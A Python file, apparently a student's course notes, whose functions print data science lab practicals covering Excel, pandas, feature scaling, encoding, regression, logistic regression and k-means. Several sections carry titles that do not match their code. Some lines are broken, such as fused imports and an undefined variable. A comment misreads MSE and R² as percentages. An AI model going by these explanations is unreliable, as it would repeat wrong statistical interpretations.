def test1():
    print(
    """
Hello from bency test
    """
        )

def ExcelDesc():
    print("""
    Aim: Introduction to Excel
 Perform conditional formatting on a dataset using various criteria.
 Create a pivot table to analyze and summarize data.
 Use VLOOKUP function to retrieve information from a different
worksheet or table.
 Perform what-if analysis using Goal Seek to determine input values for
desired output.
    """)

def Excel():
    print(
    """
Practical No. 1

Aim: Introduction to Excel
 Perform conditional formatting on a dataset using various criteria.
 Create a pivot table to analyze and summarize data.
 Use VLOOKUP function to retrieve information from a different
worksheet or table.
 Perform what-if analysis using Goal Seek to determine input values for
desired output.

Perform conditional formatting on a dataset using various criteria.
We perform conditional formatting on the &quot;Profit&quot; column to highlight cells with a profit
greater than 800 using following steps:
Steps:
1. Select the "Profit" column (Column E)
2. Go to the "Home" tab on the ribbon.
3. Click on "Conditional Formatting" in the toolbar.
4. Choose "Highlight Cells Rules" and then "Greater Than."
5. Enter the threshold value as 800.
6. Customize the formatting options (e.g., choose a fill color).
7. Click "OK" to apply the rule.


Create a pivot table to analyze and summarize data.
1. Select the entire dataset including headers.
2. Go to the "Insert" tab on the ribbon.
3. Click on "PivotTable."
4. Choose where you want to place the PivotTable (e.g., new worksheet).
5. Drag "Category" to the Rows area.
6. Drag "Sales" to the Values area, choosing the sum function.


Use VLOOKUP function to retrieve information from a different
worksheet or table.
Use the VLOOKUP function to retrieve the category of &quot;Product M&quot; from a separate
worksheet named &quot;Product Table&quot; using following steps:

Steps:
1. Assuming your "Product Table" is in a different worksheet.
2. In a cell in your main dataset, enter the formula:
=VLOOKUP("M", 'Product Table'!A:B, 2, FALSE)

=VLOOKUP(G7,Fees!A1:B24,1,FALSE) (For Fees in Student table)

=VLOOKUP(B2, Dummy_Data_2!$A$2:$D$6, 2, FALSE)

    """
        )

def DataFrameProcDesc():
    print(
    """
Data Frames and Basic Data Pre-processing
 Read data from CSV and JSON files into a data frame.
 Perform basic data pre-processing tasks such as handling missing values and
outliers.
 Manipulate and transform data using functions like filtering, sorting, and
grouping.
    """
        )

def DataFrameProc():
    print(
    """
Practical 2

Data Frames and Basic Data Pre-processing
 Read data from CSV and JSON files into a data frame.
 Perform basic data pre-processing tasks such as handling missing values and
outliers.
 Manipulate and transform data using functions like filtering, sorting, and
grouping.

Loading Data
2.1 Loading a Sample Dataset
from sklearn import datasetsfrom sklearn.datasets import load_diabetes

# Load the digits dataset
diabetes = load_diabetes()

# Access the data and assign it to the 'features' variable
features = diabetes.data
features[0]


2.2 Creating A Simulated DataSet
# load library
from sklearn import datasets
from sklearn.datasets import make_regression

wine = datasets.load_wine()

from sklearn.datasets import load_diabetes

# Load the digits dataset
diabetes = load_diabetes()

# Access the data and target attributes
features = diabetes.data
target = diabetes.target

# View feature matrix and target vector
print("Feature Matrix:\n", features[:3])
print("Target Vector:\n", target[:3])

# load library
from sklearn.datasets import make_classification


# generate features matrix and target vector
features, target = make_classification(n_samples = 100,
                                       n_features = 3,
                                       n_informative = 3,
                                       n_redundant = 0,
                                       n_classes = 2,
                                       weights = [.25, .75],
                                       random_state = 1)


# view feature matrix and target vector
print("Feature matrix\n {}".format(features[:3]))
print("Target vector\n {}".format(target[:3]))


# load library
from sklearn.datasets import make_blobs



# generate feature_matrix and target vector
features, target = make_blobs(n_samples = 100,
                              n_features = 2,
                              centers = 3,
                              cluster_std = 0.5,
                              shuffle = True,
                              random_state = 1)


# view feature matrix and target vector
print("Feature Matrix\n {}".format(features[:3]))
print("Target Vector\n {}".format(target[:3]))



# load library
import matplotlib.pyplot as plt


# view scatterplot
plt.scatter(features[:, 0], features[:, 1], c=target)
plt.show()


2.3 Loading a CSV File

#load library
import pandas as pd

# create url
url = r"../Prac2/data.csv"

df = pd.read_csv(url)

df.head(2)


 2.4 Loading an Excel File
# load library
import pandas as pd

# create url
url = r"../Prac2/data.xlsx"

import matplotlib as plot

import pandas as pd

df = pd.read_excel(url, sheet_name=0, header=None)

df.head(2)

2.5 Loading A JSON File

# load library
import pandas as pd

# Read CSV file into a DataFrame
df = pd.read_csv('./2023-11/2023-11-avon-and-somerset-outcomes.csv')

# Convert DataFrame to JSON
json_data = df.to_json(orient='records')

# Save JSON data to a file
with open('output.json', 'w') as json_file:
    json_file.write(json_data)

#Read the JSON file
df = pd.read_json('./output.json')

#Print first 5 entries
df.head()


2.6 Loading From SQL
#load the necessary libraries
import pandas as pd
import sqlalchemy

engine = sqlalchemy.create_engine('mysql+pymysql://root:root@localhost:3306/movies')

df = pd.read_sql_table("movie",engine)

df


df.head()
    """
        )



def WranglingDesc():
    print(
    """
Feature Scaling and Dummification
 Apply feature-scaling techniques like standardization and normalization to
numerical features.
 Perform feature dummification to convert categorical variables into numerical
representations.
    """
        )


def Wrangling():
    print(
    """
Practical 3
**Data Wrangling**

Feature Scaling and Dummification
 Apply feature-scaling techniques like standardization and normalization to
numerical features.
 Perform feature dummification to convert categorical variables into numerical
representations.


3.1 Creating a Dataframe
#import libraries and create dataframe
import pandas as pd
dataframe = pd.DataFrame()

3.2 Describing the data

#Read the CSV file
url = "./Iris.csv"
df = pd.read_csv(url)

#Show first five rows
df.head()

df.head(1)

#Show dimensions
print("Dimensions: {}".format(df.shape))

#Show Statistics
df.describe()


3.3 Navigating DataFrames
#Select First Row
print(df.iloc[0])

#SelectThree Rows
print(df.iloc[1:4])

#All rows upto and including the fourth row
print(df.iloc[:4])


print(df.columns)

#Set Index
df.set_index("Id")

#Show Row
val = 1
df.loc[val]


3.4 Selecting Rows Based on Conditions
#Select top two rows where column "SepalLengthCm" is > 4
df[df['SepalLengthCm']>= 4].head(2)

#Multiple Conditions
df[(df['SepalLengthCm']>= 4) & (df['SepalWidthCm']<= 3) ]



3.5 Replacing Values
#Replace any instance of "Iris-setosa" with "Iris-Setosa"
df['Species'].replace("Iris-setosa","Iris-Setosa").head()

#Replace any instance of "Iris-Setosa" with "Iris-setosa" and "Iris-virginica" with "Iris-Virginica"
df['Species'].replace(["Iris-Setosa","Iris-setosa"],["Iris-virginica","Iris-Virginica"]).head()

df.replace(1,"One").head()

df.replace("One",1).head()

3.6 Renaming Columns

df.rename(columns={'SepalLengthCm':"Sepal Length In CM",'SepalWidthCm':'SepalWidthInCm'}).head()


df.rename(columns={'Sepal Length In CM':"SepalLengthCm",'SepalWidthCm':'SepalWidthInCm'}).head()


print('Maximum: {}'.format(df ['SepalWidthCm'].max()))


print('Minimum: {}'.format(df['SepalWidthCm'].min())) 


print('Mean: {}'.format(df ['SepalWidthCm'].mean()))


print('Sum: {}'.format(df ['SepalWidthCm'].sum()))


print('Count: {}'.format(df ['SepalWidthCm'].count())) 


import numpy as np
# Select numeric columns
numeric_columns = df.select_dtypes(include=[np.number])

# Calculate values for numeric columns
Variance = numeric_columns.var()
Standard_Deviation =numeric_columns.std()
Kurtosis=numeric_columns.kurt()
Skewness=numeric_columns.skew()
print("Variance: ",Variance)
print("Standard Deviation: ",Standard_Deviation)
print("Kurtosis: ",Kurtosis)
print("Skewness: ",Skewness)


3.8 Finding Unique Values 



# unique will return an array of all unique values in a column 
df ['SepalLengthCm'].unique() 


# value_counts will display all unique values with the number of times each value appears 
df ['SepalLengthCm'].value_counts()


3.9 Handling Missing Values 

# select missing values, show 2 rows 
df[df ['SepalLengthCm'].isnull()].head (2) 


3.10 Deleting a Column 
# axis=1 means the column axis
df.drop('Id', axis=1).head (2) 


3.11 Deleting a Row
# create new dataframe excluding the rows you want to delete 
df[df ['SepalLengthCm']=='5.1'].head (2) 



# delete a row by matching a unique value 
df [df['SepalLengthCm'] != '5.1'].head(2)

# delete a row by index
df[df.index!=0].head(2)


3.13 Grouping Rows by Values
df.groupby('Species').mean() 
df.groupby('Species') ['Species'].count()



3.15 Looping Over a Column

# for .. in.. loop 
for name in df ['Species'][0:2]: 
    print(name.upper()) 

# list comprehension (more "pythonic") 
[name.upper() for name in df ['Species'] [0:2]] 

3.16 Applying a Function Over All Elements in a Column

def uppercase(x): 
    return x.upper() 
df ['Species'].apply(uppercase) [0:2] 



3.17 Applying a Function to Groups 

df.groupby('Species').apply(lambda x: x.count())
    """
        )


def HypothesisDesc():
    print(
    """
Hypothesis Testing
 Formulate null and alternative hypotheses for a given problem.

 Conduct a hypothesis test using appropriate statistical tests (e.g., t-test, chi-
square test).

 Interpret the results and draw conclusions based on the test outcomes.
    """
        )

def Hypothesis():
    print(
    """
Practical 4

Hypothesis Testing
 Formulate null and alternative hypotheses for a given problem.

 Conduct a hypothesis test using appropriate statistical tests (e.g., t-test, chi-
square test).

 Interpret the results and draw conclusions based on the test outcomes.

4.1 Rescaling a feature
Use scikit-learn's MinMaxScaler to rescale a feature array

import numpy as np 
from sklearn import preprocessing

# create a feature 
feature= np.array([ 
[-500.5], 
[-100.1], 
[0], 
[100.1],
[900.9]]) 



# create scaler 
minmax_scaler = preprocessing. MinMaxScaler (feature_range=(0,1)) 

# scale feature 
scaled_feature = minmax_scaler.fit_transform(feature) 


scaled_feature 




4.2 Standardizing a Feature 
scikit-learn's StandardScaler transforms a feature to have a mean of 0 and a standard deviation of 1. 

# create a feature 
feature= np.array([ 
[-1000.1], 
[-200.2], 
[500.5], 
[600.6], 
[9000.9] 
]) 




# create scaler 
scaler = preprocessing. StandardScaler()


# transform the feature 
standardized = scaler.fit_transform(feature)


standardized


print("Mean {}".format(round (standardized.mean()))) 
print("Standard Deviation: {}".format(standardized.std())) 


# create scaler 
robust_scaler = preprocessing.RobustScaler() 


#transform feature 
robust_scaler.fit_transform(feature)


from sklearn.preprocessing import Normalizer


# create feature matrix 
features = np.array([ 
[0.5, 0.5], 
[1.1, 3.4], 
[1.5, 20.2],  
[1.63, 34.4], 
[10.9, 3.3] ])



# create normalizer 
normalizer = Normalizer(norm="l2")


#transform feature matrix 
normalizer.transform(features)



# transform feature matrix 
features_l1_norm = Normalizer(norm="l1").transform(features) 



print("Sum of the first observation's values: {}".format(features_l1_norm[0,0]), end="\n")
print("Sum of the first observation's values: 1.0")




4.9 Grouping Observations Using Clustering

from sklearn.datasets import make_blobs 
from sklearn.cluster import KMeans
import pandas as pd 

features,_ = make_blobs (n_samples = 50, n_features = 2, centers = 3, random_state= 1)


df = pd.DataFrame(features, columns= ["feature_1", "feature_2"]) 

df = pd.DataFrame(features, columns= ["feature_1", "feature_2"]) 



# make k-means clusterer 
clusterer = KMeans (3, random_state=0) 


# fit clusterer 
clusterer.fit(features) 


# predict values 
df['group'] = clusterer.predict(features) 


df.head()


features= np.array([ 
[1.1, 11.1], 
[2.2, 22.2], 
[3.3, 33.3], 
[np.nan, 55]]) 



# keep only observations that are not (denoted by ~) missing 
features [~np.isnan(features).any(axis=1)]


df = pd.DataFrame(features, columns= ["feature_1", "feature_2"]) 


df.dropna()


4.11 Imputing Missing Values
import numpy as np 
from sklearn.preprocessing import StandardScaler 
from sklearn.datasets import make_blobs 
#from sklearn.preprocessing import Imputer 
from sklearn.impute import SimpleImputer



# make fake data 
# Gave an error
features,_ = make_blobs(n_samples = 1000, n_features = 2, random_state = 1) 


# standardize the features 
scaler = StandardScaler() 

standardized_features = scaler.fit_transform (features) 

# replace the first feature's first value with a missing value true_value = standardized_features [0, 0] 
standardized_features [0,0] = np.nan 



# create imputer 
#mean_imputer = Imputer (strategy="mean", axis=0)
mean_imputer = SimpleImputer(strategy="mean")


# impute values 
feautres_mean_imputed = mean_imputer. fit_transform (features) 



# compare true and imputed values print("True Value: {}".format(true_value)) 
print("Imputed Value: {}".format(feautres_mean_imputed [0,0]))
    """
        )





def AnovaDesc():
    print(
    """
ANOVA (Analysis of Variance)
 Perform one-way ANOVA to compare means across multiple groups.
 Conduct post-hoc tests to identify significant differences between group means.
    """
        )

def Anova():
    print(
    """
Practical 5




Encoding Nominal Categorical Features 
Problem:
You have a feature with nominal classes that has no intrinsic ordering (e.g., apple, pear, banana). 
Solution:
One-hot encode the feature using scikit-learn's LabelBinarizer:


import numpy as np 
from sklearn.preprocessing import LabelBinarizer, MultiLabelBinarizer



feature = np.array([ 
["Texas"], 
["California"], 
["Texas"], 
["Delaware"], 
["Texas"] ])



# create one-hot encoder 
one_hot = LabelBinarizer() 

# one-hot encode feature 
one_hot.fit_transform(feature)


# view feature classes 
one_hot.classes_


If we want to reverse the one-hot encoding, we can use inverse_transform:

# reverse one-hot encoding 
one_hot.inverse_transform (one_hot.transform(feature))


We can even use pandas to one-hot encode the feature with get_dummies
import pandas as pd 
pd.get_dummies (feature [:, 0])


To handle a situation where each observation lists multiple classes with 
MultiLabelBinarizer():
# create multiclass feature 
multiclass_feature = [ 
("Texas", "Florida"), 
("California", "Alabama"), 
("Texas", "Florida"), 
("Delaware", "Florida"), ("Texas", "Alabama") 
]



# create multiclass one-hot encoder 
one_hot_multiclass = MultiLabelBinarizer()

# one-hot encode multiclass feature 
one_hot_multiclass.fit_transform(multiclass_feature)


# view classes 
one_hot_multiclass.classes_




5.2 Encoding Ordinal Categorical Features 
Problem:
You have an ordinal categorical feature (e.g., high, medium, low). 
Solution:
Use pandas DataFrame's replace method to transform string labels to numerical equivalents


import pandas as pd 
# create features 
df = pd.DataFrame({"Score": ["Low", "Low", "Medium", "Medium", "High"]}) 


# create mapper 
scale_mapper = { 
"Low": 1, "Medium": 2, "High": 3 
} 



# replace feature values with scale 
df ["Score"].replace(scale_mapper)


from sklearn.feature_extraction import DictVectorizer 
data_dict = [ 
{"Red": 2, "Blue": 4}, 
{"Red": 4, "Blue": 3}, 
{"Red": 1, "Yellow":2}, 
{"Red": 2, "Yellow": 2} ]



# create dictionary vectorizer 
#force DictVectorizer to output a
dictvectorizer = DictVectorizer (sparse=False) 



# convert dictionary to feature matrix 
features = dictvectorizer.fit_transform(data_dict)



features


# get feature names 
dictvectorizer.get_feature_names_out()




Imputing Missing Class Values 
Problem:
You have a categorical feature containing missing values that you want to replace with predicted 
values. 
Solution:
The ideal solution is to train a machine learning classifier algorithm to predict the missing 
values, commonly a k-nearest neighbors (KNN) classifier

# load libraries 
import numpy as np
from sklearn.neighbors import KNeighborsClassifier


X = np.array([[0, 2.10, 1.45], 
[1, 1.18, 1.33], 
[0, 1.22, 1.27], 
[1, -0.21, -1.19]]) 


X_with_nan = np.array([[np.nan, 0.87, 1.31], 
[np.nan, -0.67, -0.22]])


# train KNN learner 
clf = KNeighborsClassifier(3, weights='distance') 
trained_model = clf.fit(X[:,1:], X[:, 0])


# predict missing values' class 
imputed_values = trained_model.predict(X_with_nan[:, 1:]) 


# join column of predicted class with their other features 
X_with_imputed = np.hstack((imputed_values.reshape(-1, 1), X_with_nan[:, 1:]))



# join two feature matricies 
np.vstack((X_with_imputed, X))



An alternative solution is to fill in missing values with the feature's most frequent value

#from sklearn.preprocessing import Imputer 
from sklearn. impute import SimpleImputer



# join the two feature matricies. 
X_complete = np.vstack((X_with_nan, X))


imputer = SimpleImputer(missing_values=np.nan,strategy='most_frequent') #strategy


imputer.fit_transform (X_complete)


Handling Imbalanced Classes 
Problem 
You have a target vector (dataset) with highly imbalanced classes.

import numpy as np 
from sklearn. ensemble import RandomForestClassifier 
from sklearn.datasets import load_iris 
iris = load_iris()


features = iris.data 
target = iris.target


# remove first 40 observations 
features = features [40:, :] 
target = target [40:]


# create binary target vector indicating if class 0 
target = np.where((target == 0), 0, 1)


target


# create weights 
weights = {0: .9, 1: 0.1}



# Create random forest classifier with weights 
RandomForestClassifier(class_weight=weights) 
RandomForestClassifier (class_weight={0: 0.9, 1: 0.1})


You can pass balanced, which automatically creates weights inversely proportional to class frequencies

RandomForestClassifier (class_weight="balanced") 


i_class0 = np.where(target == 0) [0] 
i_class1 = np.where(target == 1) [0]

n_class0 = len(i_class0) 
n_class1 = len(i_class1)

i_class1_downsampled = np.random.choice(i_class1, size=n_class0, replace=False)



np.hstack((target [i_class0], target [i_class1_downsampled]))

## Join together class 0's feature matrix with the 
# downsampled class 1's feature matrix 
np.vstack((features[i_class0,:], features [i_class1_downsampled, :]))[0:5]


i_class_upsampled = np.random.choice(i_class0, size=n_class1, replace=True) 

np.concatenate((target [i_class_upsampled], target [i_class1]))


# Join together class 0's upsampled feature matrix with class 1's feature matrix 
np.vstack((features[i_class_upsampled,:], features[i_class1,:]))[0:5]
    """
        )




def RegressDesc():
    print(
    """
Regression and Its Types
 Implement simple linear regression using a dataset.
 Explore and interpret the regression model coefficients and goodness-of-fit
measures.
 Extend the analysis to multiple linear regression and assess the impact of
additional predictors.
    """
        )

def Regress():
    print(
    """
Practical 6

Regression and Its Types
 Implement simple linear regression using a dataset.
 Explore and interpret the regression model coefficients and goodness-of-fit
measures.
 Extend the analysis to multiple linear regression and assess the impact of
additional predictors.

Simple Regression

import pandas as pd

# Reading csv file from github repo
advertising = pd.read_csv('tvmarketing.csv')

# Display the first 5 rows
advertising.head()


# Display the last 5 rows
advertising.tail()


# Check the columns
advertising.info()


# Check the shape of the DataFrame (rows, columns)
advertising.shape


# Look at some statistical information about the dataframe.
advertising.describe()



# Visualise the relationship between the features and the response using scatterplots
advertising.plot(x='TV',y='Sales',kind='scatter')



Perfroming Simple Linear Regression

Equation of linear regression
y=c+m1x1+m2x2+...+mnxn

y is the response
c is the intercept
m1 is the coefficient for the first feature
mn is the coefficient for the nth feature

In our case:

y=c+m1×TV

The m values are called the model coefficients or model parameters.



# Putting feature variable to X
X = advertising['TV']

# Print the first 5 rows
X.head()


# Putting response variable to y
y = advertising['Sales']

# Print the first 5 rows
y.head()


#random_state is the seed used by the random number generator, it can be any integer.

from sklearn.model_selection import train_test_split
X_train, X_test, y_train, y_test = train_test_split(X, y, train_size=0.7 , random_state=0000)



print(type(X_train))
print(type(X_test))
print(type(y_train))
print(type(y_test))



train_test_split


print(X_train.shape)
print(y_train.shape)
print(X_test.shape)
print(y_test.shape)


#It is a general convention in scikit-learn that observations are rows, while features are columns. 
#This is needed only when you are using a single feature; in this case, 'TV'.

#Simply put, numpy.newaxis is used to increase the dimension of the existing array by one more dimension,
import numpy as np
import pandas as pd
from sklearn.model_selection import train_test_split

# Assuming X_train and X_test are pandas Series
X_train = X_train.to_numpy()[:, np.newaxis]
X_test = X_test.to_numpy()[:, np.newaxis]

# Alternatively, you can convert them directly when creating the train-test split
X_train, X_test, y_train, y_test = train_test_split(X.to_numpy()[:, np.newaxis], y, test_size=0.3, random_state=42)

# Ensure X_train and X_test are numpy arrays
print(type(X_train))
print(type(X_test))



print(X_train.shape)
print(y_train.shape)
print(X_test.shape)
print(y_test.shape)



# import LinearRegression from sklearn
from sklearn.linear_model import LinearRegression

# Representing LinearRegression as lr(Creating LinearRegression Object)
lr = LinearRegression()

# Fit the model using lr.fit()
lr.fit(X_train, y_train)




Co-Efficients Calculation


# Print the intercept and coefficients
print(lr.intercept_)
print(lr.coef_)

y=6.989+0.0464×TV

Now, let's use this equation to predict our sales.

# Making predictions on the testing set
y_pred = lr.predict(X_test)


type(y_pred)


y_test.shape # cheek the shape to generate the index for plot


# Actual vs Predicted
import matplotlib.pyplot as plt
c = [i for i in range(1,61,1)]         # generating index 
fig = plt.figure()
plt.plot(c,y_test, color="blue", linewidth=2, linestyle="-")
plt.plot(c,y_pred, color="red",  linewidth=2, linestyle="-")
fig.suptitle('Actual and Predicted', fontsize=20)              # Plot heading 
plt.xlabel('Index', fontsize=18)                               # X-label
plt.ylabel('Sales', fontsize=16)                       # Y-label




# Error terms
c = [i for i in range(1,61,1)]
fig = plt.figure()
plt.plot(c,y_test-y_pred, color="blue", linewidth=2, linestyle="-")
fig.suptitle('Error Terms', fontsize=20)              # Plot heading 
plt.xlabel('Index', fontsize=18)                      # X-label
plt.ylabel('ytest-ypred', fontsize=16)                # Y-label


from sklearn.metrics import mean_squared_error, r2_score
mse = mean_squared_error(y_test, y_pred)




r_squared = r2_score(y_test, y_pred)


print('Mean_Squared_Error :' ,mse)
print('r_square_value :',r_squared)


# this mse =7.9 means that this model is not able to match the 7.9 percent of the values
# r2 means that your model is 72% is accurate on test data .


import matplotlib.pyplot as plt
plt.scatter(y_test,y_pred,c='blue')
plt.xlabel('Y Test')
plt.ylabel('Predicted Y')
plt.grid()


import matplotlib.pyplot as plt
import numpy as np

# Calculate the slope and intercept of the regression line
slope, intercept = np.polyfit(y_test, y_pred, 1)

# Generate x values for the regression line
x_values = np.linspace(min(y_test), max(y_test), 100)
# Calculate corresponding y values using the regression line equation
y_values = slope * x_values + intercept

# Plot the scatter plot
plt.scatter(y_test, y_pred, c='blue', label='Scatter Plot')

# Plot the regression line
plt.plot(x_values, y_values, c='red', label='Regression Line')

plt.xlabel('Sales')
plt.ylabel('Predicted Sales')
plt.grid()
plt.legend()
plt.show()





Multiple Regression

#importing all the libraries
import numpy as np
import matplotlib.pyplot as plt
import pandas as pd
import seaborn as sns
import statsmodels.api as sm

%matplotlib inline

#importing dataset using panda
data = pd.read_csv('kc_house_data.csv')
#to see what my dataset is comprised of
data.head()

# Define the independent variables (features) and the dependent variable (target)
X = data[['bedrooms', 'bathrooms', 'sqft_living', 'sqft_lot', 'floors', 'waterfront', 'view', 'condition', 'grade', 'sqft_above', 'sqft_basement', 'yr_built', 'yr_renovated', 'zipcode', 'lat', 'long', 'sqft_living15', 'sqft_lot15']]
y = data['price']


# Add a constant term to the independent variables for the intercept term
X = sm.add_constant(X)


# Fit the multiple linear regression model
model = sm.OLS(y, X).fit()


# Print the coefficients
print("Coefficients:")
print(model.params)

# Additional statistics
print("\nAdditional Statistics:")
print("R-squared:", model.rsquared)
print("Adjusted R-squared:", model.rsquared_adj)
print("Standard errors of coefficients:", model.bse)
print("t-values:", model.tvalues)
print("p-values:", model.pvalues)



# Print the summary of the regression model
print(model.summary())



# Get the predicted values
results = model
y_pred = results.predict(X)



# Get the predicted values
y_pred = results.predict(X)


# Plot the actual versus predicted values
plt.figure(figsize=(10, 6))
plt.scatter(y, y_pred, c='blue', label='Actual vs. Predicted')



# Plot the actual versus predicted values
plt.figure(figsize=(10, 6))
plt.scatter(y, y_pred, c='blue', label='Actual vs. Predicted')
# Plot the regression line
plt.plot(y, y, c='red', label='Regression Line')



Simple RegressionAct
import pandas as pd
# Reading csv file from github repo
df = pd.read_csv('tvmarketing.csv')


# Display the first 5 rows
df.head()

from sklearn.linear_model import LinearRegression
import matplotlib.pyplot as plt


# Extract the features (TV) and target variable (Sales)
TV = df['TV'].values.reshape(-1, 1)
Sales = df['Sales'].values


# Create a linear regression model
model = LinearRegression()


# Fit the model
model.fit(TV, Sales)


# Print coefficients
print("Intercept:", model.intercept_)
print("Coefficient:", model.coef_[0])


# Predict using the model
Sales_pred = model.predict(TV)


from sklearn.metrics import mean_squared_error
# Calculate mean squared error
mse = mean_squared_error(Sales, Sales_pred)
print("Mean Squared Error:", mse)



# Plot the data and the regression line
plt.scatter(TV, Sales, color='blue', label='Actual Data')
plt.plot(TV, Sales_pred, color='red', linewidth=2, label='Linear Regression')
plt.xlabel('TV')
plt.ylabel('Sales')
plt.title('Simple Linear Regression')
plt.legend()
plt.grid(True)
plt.show()
    """
        )


def LogRegDesc():
    print(
    """
Logistic Regression and Decision Tree
 Build a logistic regression model to predict a binary outcome.
 Evaluate the model's performance using classification metrics (e.g., accuracy,
precision, recall).
 Construct a decision tree model and interpret the decision rules for
classification.
    """
        )


def LogReg():
    print(
    """
Practical 7

Logistic Regression and Decision Tree
 Build a logistic regression model to predict a binary outcome.
 Evaluate the model's performance using classification metrics (e.g., accuracy,
precision, recall).
 Construct a decision tree model and interpret the decision rules for
classification.


Logistic regression

import pandas as pd
from sklearn.model_selection import train_test_split
from sklearn.linear_model import LogisticRegression
from sklearn.tree import DecisionTreeClassifier
from sklearn.metrics import accuracy_score, precision_score, recall_score, f1_score


# Load the dataset
data = pd.read_csv('framingham.csv')
data.head()


# Separate features and target variable
X = data.drop(columns=['TenYearCHD'])  # Features
y = data['TenYearCHD']  # Target variable


# Split data into training and testing sets
X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42)


from sklearn.impute import SimpleImputer

# Impute missing values with the mean
imputer = SimpleImputer(strategy='mean')
X_train_imputed = imputer.fit_transform(X_train)
X_test_imputed = imputer.transform(X_test)


# Logistic Regression Model with imputed data
logistic_model = LogisticRegression(max_iter=10000)
logistic_model.fit(X_train_imputed, y_train)
logistic_predictions = logistic_model.predict(X_test_imputed)


import matplotlib.pyplot as plt
from sklearn.metrics import roc_curve, roc_auc_score

# Calculate predicted probabilities
y_pred_proba = logistic_model.predict_proba(X_test_imputed)[::,1]

# Calculate the ROC curve points
fpr, tpr, _ = roc_curve(y_test, y_pred_proba)

# Calculate the AUC
roc_auc = roc_auc_score(y_test, y_pred_proba)

# Plot the ROC curve
plt.figure()
plt.plot(fpr, tpr, label='ROC curve (area = %0.2f)' % roc_auc)
plt.plot([0, 1], [0, 1],'r--')  # Random prediction line
plt.xlim([0.0, 1.0])
plt.ylim([0.0, 1.05])
plt.xlabel('False Positive Rate')
plt.ylabel('True Positive Rate')
plt.title('Receiver Operating Characteristic (ROC) Curve')
plt.legend(loc="lower right")
plt.show()



# Scatter plot of actual vs predicted probabilities
plt.figure(figsize=(10, 6))
plt.scatter(y_test, y_pred_proba, alpha=0.5)
plt.plot([0, 1], [0, 1], 'r--', label='Random Prediction')
plt.xlabel('Actual Values')
plt.ylabel('Predicted Probabilities')
plt.title('Scatter Plot of Actual vs Predicted Probabilities')
plt.legend()
plt.show()


# Evaluation
logistic_accuracy = accuracy_score(y_test, logistic_predictions)
logistic_precision = precision_score(y_test, logistic_predictions)
logistic_recall = recall_score(y_test, logistic_predictions)
logistic_f1 = f1_score(y_test, logistic_predictions)



print("Logistic Regression Metrics:")
print("Accuracy:", logistic_accuracy)
print("Precision:", logistic_precision)
print("Recall:", logistic_recall)
print("F1 Score:", logistic_f1)



import matplotlib.pyplot as plt
from sklearn.tree import plot_tree
from sklearn.metrics import ConfusionMatrixDisplay



# Decision Tree Model with imputed data
tree_model = DecisionTreeClassifier()
tree_model.fit(X_train_imputed, y_train)
tree_predictions = tree_model.predict(X_test_imputed)




# Evaluation
tree_accuracy = accuracy_score(y_test, tree_predictions)
tree_precision = precision_score(y_test, tree_predictions)
tree_recall = recall_score(y_test, tree_predictions)
tree_f1 = f1_score(y_test, tree_predictions)



print("\nDecision Tree Metrics:")
print("Accuracy:", tree_accuracy)
print("Precision:", tree_precision)
print("Recall:", tree_recall)
print("F1 Score:", tree_f1)



# Plot decision tree
plt.figure(figsize=(20,10))
plot_tree(tree_model, feature_names=X.columns, class_names=['0', '1'], filled=True)
plt.show()


# Decision Tree Model with pruned tree
pruned_tree_model = DecisionTreeClassifier(max_depth=3)
pruned_tree_model.fit(X_train_imputed, y_train)

# Plot pruned decision tree
plt.figure(figsize=(20,10))
plot_tree(pruned_tree_model, feature_names=X.columns, class_names=['0', '1'], filled=True)
plt.show()


# Plot confusion matrix
plt.figure(figsize=(8, 6))
ConfusionMatrixDisplay.from_predictions(y_test, tree_predictions, display_labels=['0', '1'])
plt.title("Confusion Matrix for Decision Tree Classifier")
plt.show()
    """
        )


def KMeansDesc():
    print(
    """
K-Means Clustering
 Apply the K-Means algorithm to group similar data points into clusters.
 Determine the optimal number of clusters using elbow method or silhouette
analysis.
 Visualize the clustering results and analyze the cluster characteristics.
    """
        )


def KMeans():
    print("""
Practical 8

K-Means Clustering
 Apply the K-Means algorithm to group similar data points into clusters.
 Determine the optimal number of clusters using elbow method or silhouette
analysis.
 Visualize the clustering results and analyze the cluster characteristics.



KMeans


# K-Means Clustering

import sys
import sklearn
import matplotlib
import numpy as np

print('Python: {}'.format(sys.version))
print('Sklearn: {}'.format(sklearn.__version__))
print('Matplotlib: {}'.format(matplotlib.__version__))
print('NumPy: {}'.format(np.__version__))

from keras.datasets import mnist

(x_train, y_train), (x_test, y_test) = mnist.load_data()

print('Training Data: {}'.format(x_train.shape))
print('Training Labels: {}'.format(y_train.shape))


print('Testing Data: {}'.format(x_test.shape))
print('Testing Labels: {}'.format(y_test.shape))


import matplotlib.pyplot as plt

# python magic function
%matplotlib inline


# create figure with 3x3 subplots using matplotlib.pyplot
fig, axs = plt.subplots(3, 3, figsize = (12, 12))
plt.gray()

# loop through subplots and add mnist images
for i, ax in enumerate(axs.flat):
    ax.matshow(x_train[i])
    ax.axis('off')
    ax.set_title('Number {}'.format(y_train[i]))
    
# display the figure
fig.show()



Preprocessing the MNIST images


# preprocessing the images

# convert each image to 1 dimensional array
X = x_train.reshape(len(x_train),-1)
Y = y_train

# normalize the data to 0 - 1
X = X.astype(float) / 255.

print(X.shape)
print(X[0].shape)


from sklearn.cluster import MiniBatchKMeans

n_digits = len(np.unique(y_test))
print(n_digits)

# Initialize KMeans model
kmeans = MiniBatchKMeans(n_clusters = n_digits)

# Fit the model to the training data
kmeans.fit(X)



kmeans.labels_



def infer_cluster_labels(kmeans, actual_labels):
    \"""
    Associates most probable label with each cluster in KMeans model
    returns: dictionary of clusters assigned to each label
    \"""

    inferred_labels = {}

    for i in range(kmeans.n_clusters):

        # find index of points in cluster
        labels = []
        index = np.where(kmeans.labels_ == i)

        # append actual labels for each point in cluster
        labels.append(actual_labels[index])

        # determine most common label
        if len(labels[0]) == 1:
            counts = np.bincount(labels[0])
        else:
            counts = np.bincount(np.squeeze(labels))

        # assign the cluster to a value in the inferred_labels dictionary
        if np.argmax(counts) in inferred_labels:
            # append the new number to the existing array at this slot
            inferred_labels[np.argmax(counts)].append(i)
        else:
            # create a new array in this slot
            inferred_labels[np.argmax(counts)] = [i]

        #print(labels)
        #print('Cluster: {}, label: {}'.format(i, np.argmax(counts)))
        
    return inferred_labels  

def infer_data_labels(X_labels, cluster_labels):
    \"""
    Determines label for each array, depending on the cluster it has been assigned to.
    returns: predicted labels for each array
    \"""
    
    # empty array of len(X)
    predicted_labels = np.zeros(len(X_labels)).astype(np.uint8)
    
